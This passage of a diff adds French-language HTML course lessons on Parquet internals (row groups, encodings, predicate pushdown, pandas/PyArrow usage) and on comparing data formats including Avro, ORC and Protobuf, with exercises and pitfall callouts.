+      <p>L'avantage columnar de Parquet n'est pas constant : il croît directement avec le nombre de colonnes <em>non utilisées</em> par une requête donnée. Sur une table à 5 colonnes où une requête en utilise 4, le gain est modeste. Sur une table à 200 colonnes (fréquente dans des entrepôts de données d'entreprise regroupant de nombreuses sources) où une requête n'en utilise que 3, l'économie d'I/O disque peut atteindre plus de 95% par rapport à un format orienté ligne équivalent — c'est cette réalité qui explique pourquoi Parquet est devenu quasiment incontournable dès qu'un data lake dépasse quelques dizaines de colonnes par table.</p>
+
+      <div class="callout pitfall">
+        <strong>Piège courant</strong>
+        Comparer la taille et la vitesse de Parquet et CSV sur une table étroite (2-3 colonnes) et en conclure que le gain de Parquet est marginal et ne justifie pas la complexité supplémentaire. L'essentiel de l'avantage de Parquet se révèle sur des tables larges avec des requêtes sélectives sur un sous-ensemble de colonnes — un contexte de test non représentatif peut masquer complètement l'intérêt réel du format.
+      </div>
+
+      <div class="callout exercise">
+        <strong>Exercice</strong>
+        Une équipe data stocke une table de logs applicatifs à 80 colonnes (dont beaucoup de champs de debug rarement utilisés), interrogée principalement pour calculer des métriques d'usage sur 4 colonnes clés. Expliquez pourquoi Parquet est structurellement mieux adapté que CSV dans ce contexte précis, en vous appuyant sur le mécanisme physique du stockage columnar.
+      </div>
+    </section>
+
+    <section id="m5-l2" class="fmt-parquet">
+      <span class="lesson-kicker"><span class="fmt-badge">.PARQUET</span>Module 5 · Leçon 2</span>
+      <h2>Anatomie d'un Fichier Parquet : Row Groups et Column Chunks</h2>
+
+      <p>Un fichier Parquet n'est pas une simple table de colonnes stockées bout à bout — sa structure interne combine organisation en lignes ET en colonnes à des niveaux différents, un détail souvent ignoré mais essentiel pour comprendre pourquoi Parquet reste performant même pour des requêtes qui ne portent que sur une partie des lignes (pas seulement une partie des colonnes).</p>
+
+      <pre><code class="language-text">Fichier Parquet
+├── Row Group 1 (ex: lignes 0 à 999 999)
+│   ├── Column Chunk "id"       -- toutes les valeurs id de ce row group, compressées
+│   ├── Column Chunk "pays"     -- toutes les valeurs pays de ce row group, compressées
+│   └── Column Chunk "montant"  -- toutes les valeurs montant de ce row group, compressées
+├── Row Group 2 (ex: lignes 1 000 000 à 1 999 999)
+│   ├── Column Chunk "id"
+│   ├── Column Chunk "pays"
+│   └── Column Chunk "montant"
+├── ... (autres row groups)
+└── Footer : métadonnées globales (schéma, statistiques min/max par column chunk, offsets)</code></pre>
+
+      <p>Un <strong>row group</strong> est une partition horizontale du fichier (un sous-ensemble contigu de lignes), et à l'intérieur de chaque row group, les données sont organisées en <strong>column chunks</strong> — c'est donc un modèle hybride : orienté ligne au niveau macro (les row groups), orienté colonne au niveau micro (à l'intérieur d'un row group). Cette double organisation permet de combiner les deux avantages : le column pruning (ignorer des colonnes entières, leçon 1) ET le row group skipping (ignorer des row groups entiers, leçon 4), sans devoir choisir entre les deux.</p>
+
+      <h3>Le footer : le cœur de l'intelligence de Parquet</h3>
+      <p>Le footer, situé à la toute fin du fichier, contient l'ensemble des métadonnées nécessaires pour lire le fichier intelligemment : le schéma complet (noms de colonnes et types), et surtout des <strong>statistiques par column chunk</strong> — notamment la valeur minimale et maximale de chaque colonne dans chaque row group. C'est précisément cette information qui permet le predicate pushdown détaillé en leçon 4 : un moteur de requête peut lire uniquement le footer (quelques Ko) pour décider quels row groups contiennent potentiellement des données pertinentes, avant même de lire la moindre donnée réelle.</p>
+
+      <pre><code class="language-python">import pyarrow.parquet as pq
+
+fichier = pq.ParquetFile("donnees.parquet")
+
+print(f"Nombre de row groups : {fichier.num_row_groups}")
+print(f"Schéma : {fichier.schema}")
+
+# Inspecter les métadonnées d'un row group spécifique, sans lire les données elles-mêmes
+metadonnees_rg0 = fichier.metadata.row_group(0)
+for i in range(metadonnees_rg0.num_columns):
+    col = metadonnees_rg0.column(i)
+    print(f"{col.path_in_schema}: min={col.statistics.min}, max={col.statistics.max}")</code></pre>
+
+      <h3>Le compromis dans le dimensionnement des row groups</h3>
+      <p>La taille des row groups (souvent configurable à l'écriture, typiquement entre 128 Mo et 1 Go par défaut selon les outils) implique un compromis : des row groups plus petits permettent un filtrage plus fin (moins de données inutiles lues par row group ignoré), mais multiplient le nombre de métadonnées à gérer et peuvent réduire l'efficacité de la compression (qui bénéficie de blocs de données plus larges). Ce paramètre est rarement critique pour un usage standard, mais devient pertinent à optimiser sur des volumes très importants avec des moteurs de requête distribués.</p>
+
+      <div class="callout pitfall">
+        <strong>Piège courant</strong>
+        Écrire un fichier Parquet unique et massif (plusieurs dizaines de Go) avec un seul row group géant, empêchant tout parallélisme de lecture par un moteur distribué (Spark, par exemple, qui traite naturellement un row group par tâche) et réduisant l'efficacité du filtrage par statistiques min/max, qui perd sa granularité sur un unique bloc englobant toutes les données.
+      </div>
+
+      <div class="callout exercise">
+        <strong>Exercice</strong>
+        En lisant uniquement le footer d'un fichier Parquet contenant des données de ventes sur 5 ans, comment un moteur de requête pourrait-il déterminer, sans lire aucune donnée réelle, que la requête "ventes de janvier 2024" ne concerne qu'un seul row group sur les dix que contient le fichier ?
+      </div>
+    </section>
+
+    <section id="m5-l3" class="fmt-parquet">
+      <span class="lesson-kicker"><span class="fmt-badge">.PARQUET</span>Module 5 · Leçon 3</span>
+      <h2>Compression et Encodages Avancés (Dictionary, Run-Length)</h2>
+
+      <p>Le Module 1 (leçon 4) a introduit les principes généraux d'encodage et de compression. Cette leçon détaille comment Parquet les combine et les sélectionne <strong>automatiquement colonne par colonne</strong>, en fonction des caractéristiques statistiques réelles de chaque colonne — une adaptativité qu'un format orienté ligne comme CSV ne peut pas exploiter, puisqu'il ne regroupe jamais les valeurs d'une même colonne ensemble.</p>
+
+      <h3>Dictionary encoding : le choix par défaut pour la cardinalité faible</h3>
+      <p>Quand une colonne a peu de valeurs distinctes par rapport au nombre total de lignes (une colonne "pays", "statut", "catégorie"), Parquet construit automatiquement un dictionnaire des valeurs uniques et remplace chaque occurrence par un entier compact référençant ce dictionnaire.</p>
+
+      <pre><code class="language-python">import pyarrow as pa
+import pyarrow.parquet as pq
+
+# Colonne à faible cardinalité : dictionary encoding très efficace
+table = pa.table({"statut": ["actif", "inactif", "actif", "actif", "suspendu"] * 200_000})
+pq.write_table(table, "statuts.parquet", use_dictionary=True)
+
+# On peut inspecter l'encodage effectivement utilisé par colonne
+fichier = pq.ParquetFile("statuts.parquet")
+print(fichier.metadata.row_group(0).column(0).encodings)</code></pre>
+
+      <h3>Run-Length Encoding (RLE) : optimal pour les séquences triées ou répétitives</h3>
+      <p>Le RLE remplace des séquences de valeurs identiques consécutives par la valeur suivie du nombre de répétitions. Il est particulièrement efficace combiné au dictionary encoding (RLE appliqué directement sur les indices du dictionnaire plutôt que sur les valeurs textuelles) et brille sur des colonnes triées ou naturellement groupées (une colonne "année" dans des données triées chronologiquement, un flag booléen qui reste stable sur de longues séquences).</p>
+
+      <h3>Le choix intelligent et automatique de Parquet</h3>
+      <p>Parquet ne force pas un unique encodage pour toutes les colonnes — il sélectionne dynamiquement l'encodage le plus adapté à chaque colonne selon ses caractéristiques observées (cardinalité, répétitivité, type de données), et peut même combiner plusieurs techniques d'encodage avec une compression générique par-dessus (Snappy, gzip, Zstandard, vu au Module 1). C'est cette combinaison intelligente et automatique, invisible pour l'utilisateur final, qui explique une bonne partie de l'écart de taille observé entre un CSV brut et son équivalent Parquet.</p>
+
+      <pre><code class="language-python">import pandas as pd
+import numpy as np
+
+# Colonne haute cardinalité (peu d'intérêt pour dictionary encoding) vs faible cardinalité
+df = pd.DataFrame({
+    "id_unique": range(1_000_000),                              # cardinalité maximale
+    "categorie": np.random.choice(["A", "B", "C"], 1_000_000),  # cardinalité très faible
+})
+
+df.to_parquet("test.parquet")
+# Parquet appliquera naturellement un dictionary encoding efficace sur "categorie"
+# et un encodage adapté aux entiers séquentiels sur "id_unique" (souvent delta encoding)</code></pre>
+
+      <div class="callout pitfall">
+        <strong>Piège courant</strong>
+        Stocker une colonne à très haute cardinalité (un UUID unique par ligne, un timestamp à la milliseconde près) en s'attendant au même niveau de compression que pour une colonne à faible cardinalité. Le dictionary encoding perd tout son intérêt quand presque chaque valeur est unique — le gain de compression sur ce type de colonne dépend alors davantage de la compression générique (Snappy, Zstandard) que de l'encodage spécifique à Parquet.
+      </div>
+
+      <div class="callout exercise">
+        <strong>Exercice</strong>
+        Une table contient une colonne "pays" (200 valeurs distinctes possibles, très répétées) et une colonne "email" (quasiment unique par ligne). Laquelle des deux colonnes bénéficiera le plus du dictionary encoding automatique de Parquet, et pourquoi l'autre colonne ne peut structurellement pas en tirer le même bénéfice ?
+      </div>
+    </section>
+
+    <section id="m5-l4" class="fmt-parquet">
+      <span class="lesson-kicker"><span class="fmt-badge">.PARQUET</span>Module 5 · Leçon 4</span>
+      <h2>Predicate Pushdown et Column Pruning : la Lecture Sélective</h2>
+
+      <p>Cette leçon détaille le mécanisme qui explique le plus directement pourquoi les requêtes analytiques sur Parquet peuvent être des ordres de grandeur plus rapides que sur un format orienté ligne équivalent : la capacité à <strong>éviter complètement de lire</strong> des données non pertinentes pour une requête donnée, avant même de les décompresser.</p>
+
+      <h3>Column pruning : ignorer des colonnes entières</h3>
+      <p>Déjà évoqué en leçon 1 : si une requête ne porte que sur 3 colonnes parmi 50, Parquet ne lit physiquement que les column chunks correspondant à ces 3 colonnes, ignorant les 47 autres sans même les charger en mémoire pour les rejeter ensuite — un mécanisme rendu possible précisément par l'organisation en column chunks vue en leçon 2.</p>
+
+      <h3>Predicate pushdown : ignorer des row groups entiers grâce aux statistiques</h3>
+      <p>C'est le mécanisme le plus puissant et le moins intuitif : grâce aux statistiques min/max stockées dans le footer pour chaque column chunk (leçon 2), un moteur de requête peut déterminer <strong>sans lire aucune donnée</strong> qu'un row group entier ne peut absolument pas contenir de résultat pertinent pour une requête donnée, et donc l'ignorer complètement.</p>
+
+      <pre><code class="language-python">import pandas as pd
+import numpy as np
+
+# Simuler des données de ventes triées par date, réparties en plusieurs row groups
+dates = pd.date_range("2020-01-01", "2024-12-31", freq="h")
+df = pd.DataFrame({
+    "date": dates,
+    "montant": np.random.uniform(10, 500, len(dates))
+})
+df.to_parquet("ventes.parquet", row_group_size=100_000)
+
+# Requête filtrée sur une plage de dates étroite : le moteur peut ignorer
+# tous les row groups dont les statistiques min/max de "date" ne chevauchent pas ce filtre
+import pyarrow.parquet as pq
+import pyarrow.compute as pc
+
+table_filtree = pq.read_table(
+    "ventes.parquet",
+    filters=[("date", ">=", pd.Timestamp("2024-06-01")), ("date", "<", pd.Timestamp("2024-06-02"))]
+)
+print(f"Lignes lues après predicate pushdown : {table_filtree.num_rows}")
+# Sur un fichier couvrant 5 ans, un seul jour peut être extrait en ne lisant
+# qu'une fraction infime des row groups totaux -- les autres sont ignorés via le footer seul</code></pre>
+
+      <h3>Pourquoi l'ordre de tri des données amplifie ce mécanisme</h3>
+      <p>Le predicate pushdown est d'autant plus efficace que les données sont <strong>triées ou organisées</strong> selon la colonne la plus souvent filtrée (une date, un identifiant de partition). Si les données sont écrites dans un ordre aléatoire, chaque row group risque de contenir un intervalle de valeurs très large (min et max éloignés), rendant les statistiques peu discriminantes — presque tous les row groups pourraient "potentiellement" contenir une valeur recherchée, annulant le bénéfice du filtrage. Trier les données à l'écriture selon les colonnes de filtrage les plus fréquentes est une optimisation à fort impact, souvent négligée.</p>
+
+      <div class="callout pitfall">
+        <strong>Piège courant</strong>
+        Écrire des données Parquet dans un ordre non trié par rapport aux colonnes qui seront le plus fréquemment utilisées comme filtre dans les requêtes en aval (une date, une région), annulant une grande partie du bénéfice du predicate pushdown. Un fichier Parquet mal ordonné se comporte, pour les requêtes filtrées, presque comme s'il fallait lire l'intégralité des row groups malgré la présence de statistiques min/max.
+      </div>
+
+      <div class="callout exercise">
+        <strong>Exercice</strong>
+        Une table Parquet contient 5 ans de transactions, écrite sans tri particulier (ordre d'arrivée aléatoire mélangeant toutes les dates dans chaque row group). Une requête filtre sur un mois précis. Expliquez pourquoi le predicate pushdown apportera ici un gain de performance minime, et quelle action corrective simple améliorerait radicalement les futures requêtes similaires.
+      </div>
+    </section>
+
+    <section id="m5-l5" class="fmt-parquet">
+      <span class="lesson-kicker"><span class="fmt-badge">.PARQUET</span>Module 5 · Leçon 5</span>
+      <h2>Lire et Écrire du Parquet avec Pandas et PyArrow</h2>
+
+      <p>Cette leçon de synthèse pratique couvre les opérations courantes de lecture/écriture Parquet en Python, avec une attention particulière aux options qui exploitent réellement les mécanismes vus dans ce module (column pruning, predicate pushdown, partitionnement).</p>
+
+      <h3>Écriture de base et choix de la compression</h3>
+      <pre><code class="language-python">import pandas as pd
+
+df = pd.DataFrame({"id": range(1000), "pays": ["FR", "DE"] * 500, "montant": range(1000)})
+
+df.to_parquet("sortie.parquet", engine="pyarrow", compression="snappy", index=False)
+# index=False évite d'écrire l'index pandas comme une colonne parasite dans le fichier</code></pre>
+
+      <h3>Lecture sélective : n'exploiter la performance columnar qu'en spécifiant les colonnes</h3>
+      <pre><code class="language-python">import pandas as pd
+
+# Colonnes explicitement sélectionnées : exploite pleinement le column pruning (leçon 4)
+df_partiel = pd.read_parquet("sortie.parquet", columns=["pays", "montant"])
+
+# Anti-pattern fréquent : charger toutes les colonnes puis filtrer après coup en pandas,
+# ce qui annule l'essentiel de l'avantage de performance de Parquet
+df_tout = pd.read_parquet("sortie.parquet")  # lit TOUTES les colonnes, y compris "id" non utilisée
+df_filtre_apres = df_tout[["pays", "montant"]]</code></pre>
+
+      <h3>Le partitionnement : une extension du concept de row group au niveau du système de fichiers</h3>
+      <p>Au-delà des row groups internes à un fichier Parquet, il est très courant d'organiser plusieurs fichiers Parquet en dossiers physiquement séparés selon une ou plusieurs colonnes (typiquement une date ou une région) — le <strong>partitionnement Hive-style</strong>. Cela permet à un moteur de requête d'ignorer des <em>fichiers entiers</em> avant même d'ouvrir le moindre footer, simplement en lisant les noms de dossiers.</p>
+
+      <pre><code class="language-python">import pandas as pd
+import numpy as np
+
+df = pd.DataFrame({
+    "date": pd.date_range("2024-01-01", periods=10000, freq="h"),
+    "montant": np.random.uniform(10, 500, 10000)
+})
+df["annee"] = df["date"].dt.year
+df["mois"] = df["date"].dt.month
+
+# Écrit une arborescence : dataset/annee=2024/mois=1/*.parquet, dataset/annee=2024/mois=2/*.parquet, ...
+df.to_parquet("dataset/", partition_cols=["annee", "mois"], engine="pyarrow")
+
+# La lecture filtrée sur la partition évite d'ouvrir les fichiers des autres mois
+df_janvier = pd.read_parquet("dataset/", filters=[("mois", "==", 1)])</code></pre>
+
+      <h3>Choisir entre pandas et PyArrow directement</h3>
+      <p>Pandas offre une API plus familière pour l'analyse exploratoire, tandis que PyArrow (que pandas utilise d'ailleurs en interne comme moteur Parquet) donne accès direct aux métadonnées de bas niveau (row groups, statistiques, encodages vus dans ce module) et à de meilleures performances sur des opérations qui n'ont pas besoin de repasser par un DataFrame pandas complet, notamment pour des conversions ou des inspections de schéma.</p>
+
+      <div class="callout pitfall">
+        <strong>Piège courant</strong>
+        Charger un fichier Parquet entier avec <code>pd.read_parquet()</code> sans spécifier <code>columns</code>, puis sélectionner les colonnes utiles après coup avec <code>df[colonnes]</code>. Cette pratique, très répandue, annule une grande partie de l'avantage columnar de Parquet : le filtrage de colonnes doit être exprimé <em>au moment de la lecture</em> (paramètre <code>columns</code>) pour bénéficier du column pruning, pas après le chargement complet en mémoire.
+      </div>
+
+      <div class="callout exercise">
+        <strong>Exercice</strong>
+        Vous gérez un dataset Parquet de 3 ans de données de capteurs IoT, partitionné par année et par mois, régulièrement interrogé pour des analyses portant sur un seul mois à la fois. Expliquez la différence de performance attendue entre une requête qui exploite le partitionnement (<code>filters=[("mois", "==", 6)]</code>) et une requête qui charge tout le dataset puis filtre en pandas.
+      </div>
+    </section>
+
+    <div class="module-divider">
+      <span class="num">MODULE 06 · COMPARAISON</span>
+      <span class="line"></span>
+    </div>
+
+    <section id="m6-l1" class="fmt-neutral">
+      <span class="lesson-kicker"><span class="fmt-badge">CORE</span>Module 6 · Leçon 1</span>
+      <h2>Tableau Comparatif Complet : Taille, Vitesse, Lisibilité, Écosystème</h2>
+
+      <p>Après avoir exploré chaque format en profondeur, cette leçon rassemble les critères de comparaison en une vue d'ensemble structurée, destinée à servir de référence rapide plutôt qu'à être mémorisée telle quelle — l'objectif est de comprendre le <em>pourquoi</em> de chaque case du tableau, pas seulement son contenu.</p>
+
+      <table>
+        <tr><th>Critère</th><th>CSV</th><th>JSON</th><th>XML</th><th>Parquet</th></tr>
+        <tr><td>Lisibilité humaine</td><td>Élevée</td><td>Élevée</td><td>Moyenne (verbeux)</td><td>Nulle (binaire)</td></tr>
+        <tr><td>Taille sur disque (non compressé)</td><td>Compacte</td><td>Moyenne (clés répétées)</td><td>Élevée (balises répétées)</td><td>Très compacte (encodage + compression)</td></tr>
+        <tr><td>Support de schéma natif</td><td>Aucun</td><td>Optionnel (JSON Schema)</td><td>Natif (DTD/XSD)</td><td>Natif et obligatoire</td></tr>
+        <tr><td>Typage des données</td><td>Aucun (tout est texte)</td><td>Limité (6 types)</td><td>Riche via XSD</td><td>Riche et strict</td></tr>
+        <tr><td>Structures imbriquées</td><td>Non</td><td>Oui</td><td>Oui (+ contenu mixte)</td><td>Oui (types complexes/liste imbriquée)</td></tr>
+        <tr><td>Vitesse de lecture (gros volumes)</td><td>Lente</td><td>Lente à moyenne</td><td>Lente (parsing coûteux)</td><td>Très rapide (columnar)</td></tr>
+        <tr><td>Vitesse d'agrégation sur colonnes</td><td>Lente</td><td>Lente</td><td>Lente</td><td>Très rapide</td></tr>
+        <tr><td>Ouverture par un tableur</td><td>Native</td><td>Non</td><td>Non</td><td>Non</td></tr>
+        <tr><td>Écosystème / adoption</td><td>Universel</td><td>Universel (API web)</td><td>Fort dans secteurs réglementés</td><td>Standard analytique/data lake</td></tr>
+      </table>
+
+      <h3>Ce que ce tableau ne dit pas : le contexte prime toujours sur la case cochée</h3>
+      <p>Un tableau comparatif figé donne une fausse impression de choix purement technique et objectif, alors que le meilleur format dépend presque toujours de facteurs contextuels non capturés dans ce type de grille : quel outil en aval va consommer ce fichier (un humain avec Excel n'a que faire de la vitesse d'agrégation columnar), quelles contraintes réglementaires ou contractuelles imposent un format précis (Module 4, leçon 4), ou quelle dette technique existante rendrait un changement de format coûteux malgré des avantages théoriques (Module 6, leçon 4).</p>
+
+      <h3>Une lecture par cas d'usage, pas par format</h3>
+      <p>Plutôt que de se demander "quel est le meilleur format ?", la question productive est "quel est le pattern d'usage dominant de ce fichier, et quel format répond le mieux à ce pattern précis ?" — c'est l'objet de la leçon suivante, qui inverse la logique de ce tableau pour partir du besoin plutôt que du format.</p>
+
+      <div class="callout pitfall">
+        <strong>Piège courant</strong>
+        Utiliser ce tableau comparatif comme une grille de score à additionner pour désigner un "gagnant" universel. Aucun format ne domine sur tous les critères simultanément par construction — Parquet perd délibérément en lisibilité humaine pour gagner en performance analytique, XML accepte la verbosité pour gagner en validation et en richesse sémantique. Chaque case forte est le résultat d'un compromis de conception assumé, pas d'une supériorité générale.
+      </div>
+
+      <div class="callout exercise">
+        <strong>Exercice</strong>
+        En vous basant uniquement sur ce tableau, un stakeholder non technique vous demande "pourquoi n'utilise-t-on pas Parquet partout, puisqu'il est le plus rapide et le plus compact ?". Formulez une réponse en deux phrases maximum qui explique le compromis fondamental sans jargon technique.
+      </div>
+    </section>
+
+    <section id="m6-l2" class="fmt-neutral">
+      <span class="lesson-kicker"><span class="fmt-badge">CORE</span>Module 6 · Leçon 2</span>
+      <h2>Quel Format pour Quel Cas d'Usage Réel</h2>
+
+      <p>Cette leçon inverse volontairement la logique de la précédente : plutôt que de partir des formats pour lister leurs propriétés, elle part de situations concrètes de data analyst et propose un format recommandé avec sa justification, pour ancrer la décision dans des cas réels plutôt que dans une grille abstraite.</p>
+
+      <table>
+        <tr><th>Situation</th><th>Format recommandé</th><th>Justification</th></tr>
+        <tr><td>Export mensuel pour un directeur commercial, ouvert dans Excel</td><td>CSV</td><td>Lisibilité et compatibilité tableur avant tout ; volume faible, performance non critique</td></tr>
+        <tr><td>Réponse d'une API REST publique consommée par des développeurs tiers</td><td>JSON</td><td>Standard de facto du web, lisible, structures imbriquées naturelles pour des ressources riches</td></tr>
+        <tr><td>Flux d'événements de tracking à 50 000 événements/seconde</td><td>JSON Lines, puis Parquet pour l'archivage</td><td>Streaming ligne par ligne à l'ingestion (Module 3), columnar pour l'analyse historique (Module 5)</td></tr>
+        <tr><td>Échange de virements bancaires internationaux réglementés</td><td>XML (ISO 20022)</td><td>Standard imposé réglementairement, validation XSD stricte requise (Module 4)</td></tr>
+        <tr><td>Data lake analytique interrogé par des centaines d'analystes</td><td>Parquet</td><td>Performance columnar sur des requêtes sélectives répétées (Module 5)</td></tr>
+        <tr><td>Configuration d'application versionnée dans un dépôt Git</td><td>JSON (ou YAML)</td><td>Lisibilité pour un humain relisant un diff, structure simple</td></tr>
+        <tr><td>Extraction ponctuelle pour un data scientist qui va explorer dans un notebook</td><td>CSV ou Parquet selon le volume</td><td>CSV si &lt; quelques centaines de Mo pour la simplicité, Parquet au-delà pour la vitesse de chargement</td></tr>
+      </table>
+
+      <h3>Le cas le plus fréquent en pratique : plusieurs formats dans le même pipeline</h3>
+      <p>Un point déjà anticipé au Module 1 (leçon 5) et qui mérite d'être répété ici avec des exemples concrets : la plupart des pipelines de données réels traversent successivement plusieurs formats, chacun adapté à l'étape où il intervient. Un exemple typique dans une entreprise e-commerce : les commandes arrivent en JSON depuis l'API du site web, sont relayées entre microservices internes toujours en JSON, puis archivées quotidiennement en Parquet dans le data lake pour l'analyse historique, tandis qu'un export CSV hebdomadaire est généré pour l'équipe finance qui travaille sous Excel.</p>
+
+      <h3>Le signal qui doit déclencher une réévaluation du format</h3>
+      <p>Un format choisi initialement pour de bonnes raisons peut devenir inadapté quand le contexte évolue — c'est le signal à surveiller activement plutôt que de subir : un export CSV qui prenait 2 secondes à charger en devient un qui en prend 5 minutes à mesure que le volume croît organiquement, un flux JSON entre microservices qui devient un goulot d'étranglement CPU mesurable une fois le trafic multiplié par 100. Ces signaux de dérive progressive sont plus difficiles à détecter qu'un choix initial manifestement mauvais, car ils s'installent graduellement sans qu'aucun événement ponctuel ne déclenche une remise en question.</p>
+
+      <div class="callout pitfall">
+        <strong>Piège courant</strong>
+        Continuer à utiliser un format devenu inadapté simplement parce que "ça a toujours fonctionné comme ça", sans jamais réévaluer le choix à mesure que le volume de données ou la fréquence d'accès évoluent significativement par rapport au contexte initial du choix. Un format n'est jamais définitivement "le bon" — c'est une décision à réévaluer périodiquement au même titre que n'importe quel choix d'architecture technique.
+      </div>
+
+      <div class="callout exercise">
+        <strong>Exercice</strong>
+        Une startup exporte ses données de transactions en CSV depuis 2 ans. Le volume est passé de 10 000 à 50 millions de lignes par mois, et l'équipe data se plaint que les analyses prennent "de plus en plus de temps sans qu'on ait rien changé au code". Diagnostiquez ce qui se passe probablement et proposez une transition de format progressive et à faible risque.
+      </div>
+    </section>
+
+    <section id="m6-l3" class="fmt-neutral">
+      <span class="lesson-kicker"><span class="fmt-badge">CORE</span>Module 6 · Leçon 3</span>
+      <h2>Formats Alternatifs à Connaître : Avro, ORC, Protobuf</h2>
+
+      <p>CSV, JSON, XML et Parquet couvrent l'essentiel des besoins courants d'un data analyst, mais trois autres formats reviennent fréquemment dans les architectures de données modernes et méritent d'être reconnus, même sans en faire un usage quotidien.</p>
+
+      <h3>Apache Avro : le format d'échange orienté ligne avec schéma intégré</h3>
+      <p>Avro est un format binaire orienté <strong>ligne</strong> (contrairement à Parquet) avec un schéma intégré directement dans le fichier, exprimé en JSON. Sa particularité distinctive est une gestion native et particulièrement mature de l'<strong>évolution de schéma</strong> (schema evolution, approfondi au Module 7) — ajouter un champ optionnel à un schéma Avro ne casse jamais la lecture de données écrites avec l'ancien schéma, un problème plus délicat à gérer proprement avec Parquet ou JSON. Avro est le format de choix pour les systèmes de messagerie à fort débit comme Apache Kafka, où les producteurs et consommateurs de messages évoluent indépendamment dans le temps.</p>
+
+      <h3>Apache ORC (Optimized Row Columnar) : le concurrent direct de Parquet</h3>
+      <p>ORC partage la même philosophie columnar que Parquet (row groups équivalents appelés "stripes", statistiques min/max, encodages avancés) et offre des performances globalement comparables. La différence est surtout historique et écosystémique : ORC a été développé dans l'écosystème Hadoop/Hive, tandis que Parquet a émergé de Twitter/Cloudera avec un fort ancrage dans l'écosystème Spark — aujourd'hui, Parquet bénéficie d'une adoption plus large en dehors de l'écosystème Hadoop historique, ce qui en fait le choix par défaut recommandé sauf contrainte spécifique imposant ORC (une infrastructure Hive existante, par exemple).</p>
+
+      <h3>Protocol Buffers (Protobuf) : la performance maximale pour la communication inter-services</h3>
+      <p>Protobuf, développé par Google, est un format binaire nécessitant un schéma défini explicitement <em>à l'avance</em> dans un fichier <code>.proto</code>, à partir duquel du code de sérialisation/désérialisation est généré automatiquement pour de nombreux langages. Contrairement à JSON, dont le schéma est optionnel et vérifié après coup (Module 3, leçon 4), Protobuf impose le schéma en amont, ce qui permet une sérialisation nettement plus rapide et compacte, au prix d'une perte de lisibilité humaine directe (un message Protobuf brut n'est pas exploitable sans le schéma associé).</p>
+
+      <pre><code class="language-protobuf">// Exemple de schéma Protobuf (fichier .proto)
+message Commande {
+  int32 id = 1;
+  string client = 2;
+  repeated string articles = 3;
+  double montant = 4;
+}</code></pre>
+
+      <table>
+        <tr><th>Format</th><th>Organisation</th><th>Cas d'usage typique</th></tr>
+        <tr><td>Avro</td><td>Ligne, binaire</td><td>Messagerie Kafka, schema evolution fréquente</td></tr>
+        <tr><td>ORC</td><td>Colonne, binaire</td><td>Écosystème Hadoop/Hive historique</td></tr>
+        <tr><td>Protobuf</td><td>Ligne, binaire, schéma a priori</td><td>Communication inter-services à très haute performance (gRPC)</td></tr>
+      </table>
+
+      <div class="callout pitfall">
+        <strong>Piège courant</strong>
+        Considérer Parquet comme le choix par défaut universel pour tout besoin de sérialisation binaire performante, y compris pour de la communication inter-services temps réel où un enregistrement individuel doit être sérialisé/désérialisé rapidement. Parquet, orienté colonne, est optimisé pour des scans analytiques par lot, pas pour la sérialisation unitaire rapide d'un seul enregistrement — Protobuf ou Avro sont structurellement mieux adaptés à ce second cas.
+      </div>
+
+      <div class="callout exercise">
+        <strong>Exercice</strong>
+        Une équipe doit choisir un format pour des messages échangés à très haute fréquence entre microservices via Kafka, sachant que le schéma des messages évoluera fréquemment (nouveaux champs ajoutés par différentes équipes à des rythmes différents) sans jamais casser la compatibilité avec les anciens consommateurs. Lequel des trois formats de cette leçon recommanderiez-vous, et pourquoi les deux autres sont-ils moins adaptés à cette contrainte spécifique ?
+      </div>
+    </section>
+
+    <section id="m6-l4" class="fmt-neutral">
+      <span class="lesson-kicker"><span class="fmt-badge">CORE</span>Module 6 · Leçon 4</span>
+      <h2>Le Piège du Format Hérité par Défaut</h2>
+
+      <p>Cette dernière leçon du module de comparaison aborde un biais organisationnel plus qu'un piège purement technique : la tendance à perpétuer un choix de format historique sans jamais le remettre en question, simplement parce qu'il est déjà en place et que le changer implique un coût de migration réel et immédiatement visible, contre un bénéfice diffus et différé dans le temps.</p>
+
+      <h3>Pourquoi ce piège est particulièrement fréquent avec les formats de données</h3>
+      <p>Contrairement à un choix de langage de programmation ou de framework, où la dette technique est souvent visible et régulièrement discutée en équipe, le format de données d'un pipeline existant est rarement remis en question tant qu'il "fonctionne" au sens où aucune erreur ne se produit — même si la performance se dégrade progressivement (Module 6, leçon 2) ou si le coût de stockage augmente silencieusement mois après mois. Le format devient une décision invisible, prise une fois puis jamais réévaluée, alors que le contexte (volume, fréquence d'accès, nombre de consommateurs) évolue continuellement autour d'elle.</p>
+
+      <h3>Un scénario typique de ce piège</h3>
+      <p>Une entreprise a choisi CSV en 2018 pour ses exports quotidiens, quand le volume tenait en quelques Mo. Six ans plus tard, ce même export atteint plusieurs Go quotidiens, alimente désormais un tableau de bord consulté par 50 personnes, et chaque rafraîchissement prend plusieurs minutes — mais personne n'a jamais formellement proposé de migrer vers Parquet, car "le pipeline fonctionne" et migrer représente un risque perçu (retester tous les scripts en aval) face à un gain qui, bien que réel, n'est jamais devenu une urgence explicite déclenchant une action.</p>
+
+      <h3>Comment identifier ce piège avant qu'il ne devienne coûteux</h3>
+      <ul>
+        <li>Auditer périodiquement (une fois par an, par exemple) les formats de données des pipelines critiques par rapport à leur volume et fréquence d'usage <em>actuels</em>, pas ceux du moment où le format a été choisi initialement.</li>
+        <li>Mesurer explicitement le temps de traitement des étapes clés d'un pipeline dans le temps — une dégradation progressive et continue est un signal plus fort qu'elle n'y paraît, même si elle reste individuellement "acceptable" à chaque mesure ponctuelle.</li>
+        <li>Considérer une migration de format comme un projet à part entière avec un ROI calculable (temps CPU économisé, coût de stockage réduit), plutôt que comme une tâche de maintenance à faible priorité perpétuellement repoussée.</li>
+      </ul>
+
+      <div class="callout pitfall">
+        <strong>Piège courant</strong>
+        Justifier le statu quo d'un format inadapté par "ça a toujours fonctionné" sans jamais quantifier le coût réel de l'inadaptation (temps CPU, coût de stockage cloud, temps d'attente des analystes) face au coût, généralement bien plus faible et ponctuel, d'une migration planifiée. L'inertie organisationnelle, pas la technique, est souvent le véritable obstacle à ce type de changement.
+      </div>
+
+      <div class="callout exercise">
+        <strong>Exercice</strong>
+        Vous découvrez qu'un pipeline critique de votre entreprise utilise encore un format CSV hérité depuis 5 ans, avec des signes clairs de dégradation de performance. Rédigez les trois arguments (quantifiables si possible) que vous présenteriez à votre management pour justifier le temps d'investissement d'une migration vers Parquet.
+      </div>
+    </section>
+
+    <div class="module-divider">
+      <span class="num">MODULE 07 · PIPELINES</span>
+      <span class="line"></span>
+    </div>
+
